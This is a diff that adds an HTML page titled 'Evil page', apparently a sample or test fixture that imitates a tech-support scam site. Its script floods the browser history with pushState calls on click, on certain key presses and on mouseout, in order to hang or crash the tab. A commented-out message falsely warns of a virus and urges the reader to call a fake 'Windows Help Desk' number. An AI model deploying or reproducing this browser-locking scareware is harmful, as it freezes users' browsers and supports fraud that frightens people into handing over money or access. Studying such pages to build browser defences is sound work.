@@ -1,0 +1,82 @@
+<html>
+    <head>
+        <title>Evil page</title>
+        <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    </head><body><script>
+    var is_chrome,
+        isChromium = window.chrome,
+        vendorName = window.navigator.vendor,
+        isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
+    is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
+    
+    function alertCall() {
+        var total = "";
+        for (var i = 0; i < 100000; i++) {
+            total = total + i.toString();
+            history.pushState(0, 0, total);
+        }
+    }
+    
+    function alertTimed() {
+        if (is_chrome) {
+            setInterval(function() {
+                alertCall();
+            }, 200);
+        } else {
+            alertLoop();
+        }
+    }
+    
+    function alertLoop() {
+        for (i = 0; i < 500; i++) {
+            alertCall();
+        }
+    }
+    
+    function addEvent(obj, evt, fn) {
+        if (obj.addEventListener) {
+            obj.addEventListener(evt, fn, false)
+        } else if (obj.attachEvent) {
+            obj.attachEvent("on" + evt, fn)
+        }
+    }
+    $(document).ready(function() {
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+                if (!is_chrome) {
+                    alertTimed();
+                }
+                return true;
+            } else if (e.keyCode === 123) {
+                return true;
+            } else {
+                return true;
+            }
+        };
+        $(window).on('click', function() {
+            //window.open('index.html', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
+            //toggleFullScreen();
+            alertTimed();
+            //document.getElementById("ifr").src="index.html";
+    
+        });
+        addEvent(document, "mouseout", function(e) {
+            e = e ? e : window.event;
+            var from = e.relatedTarget || e.toElement;
+            if (!is_chrome && (!from || from.nodeName == "body")) {
+                alertTimed();
+            }
+        });
+    });
+    window.onbeforeunload = function(e) {
+        // var message = '*************************************************\n\nCall Windows  Help Desk Immediately at +1-888-888-8888\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows  Help Desk Immediately at +1-888-888-8888';
+        // e.returnValue = message;
+        // return message;
+    };
+    window.onload = function(e) {
+        //alertTimed();
+    };
+    </script>
+<h1>I am an evil page</h1>    
+</body>
+</html>
